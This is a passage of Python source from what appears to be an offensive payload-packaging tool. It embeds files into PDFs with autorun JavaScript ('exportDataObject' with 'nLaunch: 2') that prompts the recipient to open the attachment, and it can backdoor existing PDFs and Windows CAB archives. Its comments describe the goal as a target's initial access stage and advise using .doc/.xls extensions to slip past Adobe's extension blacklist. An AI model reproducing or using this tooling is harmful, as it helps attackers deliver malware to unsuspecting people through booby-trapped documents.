WARNING:

You attempted to embed file with "{fileext}" extension into a PDF.

Adobe Acrobat reader will prevent user from opening embedded files in PDF when HAVE
blacklisted extension, where the default blacklist is following:

{exts}

The message will be:
  "Adobe Acrobat cannot open the file attachment because your PDF file attachment 
   settings do not allow this type of file to be opened."

Be vary about that, becasue this MAY HINDER your target initial access stage!

Try to find another extension for your embedded file that is not blacklisted.

Pssst. .doc/.xls work like a charm ;-)

=====================================================
''', color='red')

            fw = PdfFileWriter()

            if self.backdoorFile:
                self.logger.text('Copying pages from backdoored PDF to the output one...')

                fr = PdfFileReader(self.backdoorFile, 'rb')
                fw.appendPagesFromReader(fr)
                self.logger.info(f'Copied {fr.numPages} pages from backdoored file to output.')

            else:
                self.logger.text('Creating a new PDF with a single, blank page.')

                fw.addBlankPage(
                    width = 200,
                    height = 200
                )

            files = []

            if os.path.isfile(infile):
                files.append(infile)

            else:
                for fname in glob.iglob(infile + '/**/**', recursive=True):
                    filename = os.path.basename(fname)

                    if filename in files:
                        self.logger.fatal('Files are embedded into PDF in a flat structure. There is no way to create directories, therefore file names must be unique to be appended!')

                    if os.path.isdir(fname):
                        self.logger.fatal('Files are embedded into PDF in a flat structure. There is no way to create directories!')

                    files.append(filename)
            
            self.logger.text('Embedding files into PDF:')

            for myfile in files:
                fname = os.path.basename(myfile)
                with open(myfile, 'rb') as f:
                    data = f.read()

                self.logger.info('Adding file-autorun Javascript to the PDF')

                autorunJs = f'this.exportDataObject({{ cName: "{fname}", nLaunch: 2 }});'
                self.logger.dbg('\t' + autorunJs + '\n')
                
                fw.addJS(autorunJs)

                if len(files) == 1:
                    if self.fileName:
                        fname = self.fileName

                    self.logger.text(f'\tAdding file: {fname}')
                    fw.addAttachment(fname, data)

                else:
                    self.logger.text(f'\tAdding file: {fname}')
                    self.pdfAppendAttachment(fw, fname, data)

            if self.password:
                self.logger.text('Encrypting PDF file with password...')
                fw.encrypt(self.password)

                self.logger.text(f'''
--------------------------------------------------
CAUTION:

When PDF is password-encrypted, autorun Javascript will not execute to prompt user into opening embedded file!

--------------------------------------------------
''', color='red')

            with open(outfile, 'wb') as file:
                fw.write(file)

            return True

        except Exception as e:
            self.logger.err(f'Could not package input file into PDF! Exception: {e}')
            raise

            return False

    def packIntoCAB(self, infile, outfile):
        try:
            if self.password:
                raise Exception('Passwords are not supported by Windows Cabinet files.')

            tmpdir = None

            if self.backdoorFile:
                self.logger.text('Backdooring a Windows Cabinet (CAB)...')

                tmpdir = tempfile.TemporaryDirectory()
                with open(self.backdoorFile, "rb") as f:
                    arc = cabarchive.CabArchive(f.read())

                self.logger.dbg('Extracting files from CAB:')
                
                for k, v in arc.items():
                    lp = os.path.join(tmpdir.name, v.filename)

                    lp1 = os.path.join(tmpdir.name, os.path.dirname(lp))
                    if not os.path.isdir(lp1):
                        self.logger.dbg(f'\t- Creating temp dir: {lp1}')
                        os.makedirs(lp1, exist_ok=True)

                    self.logger.dbg(f'\t- {v.filename} => {lp}')
                    with open(lp, 'wb') as f:
                        f.write(v.buf)

                tmpname = os.path.basename(infile)
                if self.fileName:
                    tmpname = self.fileName

                tmppath = os.path.join(tmpdir.name, tmpname)
                shutil.copy(infile, tmppath)

                infile = tmpdir.name

            else:
                self.logger.text('Creating a Windows Cabinet (CAB)...')

            if os.path.isfile(infile):
                fname = os.path.basename(infile)
                if self.fileName:
                    fname = self.fileName

                arc = cabarchive.CabArchive()
                with open(infile, 'rb') as f:
                    arc[fname] = cabarchive.CabFile(f.read())

                with open(outfile, "wb") as container:
                    self.logger.text(f'\tAdding file: {fname}')
                    container.write(arc.save())
            else:
                with open(outfile, "wb") as container:
                    arc = cabarchive.CabArchive()

                    for file in glob.iglob(infile + '/**/**', recursive=True):
                        lf = file.replace(infile, '')

                        if lf == '\\' or lf == '/': 
                            continue

                        if lf.endswith('/') or lf.endswith('\\'):
                            lf = lf[:-1]

                        if lf.startswith('/') or lf.startswith('\\'):
                            lf = lf[1:]

                        if os.path.isdir(file):
                            continue

                        self.logger.dbg(f'\t- file: {file} => {lf}')

                        with open(file, 'rb') as f:
                            arc[lf] = cabarchive.CabFile(f.read())

                        self.logger.text(f'\tAdding file: {lf}')
                    
                    container.write(arc.save())

            return True

        except Exception as e:
            self.logger.err(f'Could not package input file into CAB! Exception: {e}')
            raise

            return False

        finally:
            if tmpdir:
                tmpdir.cleanup()
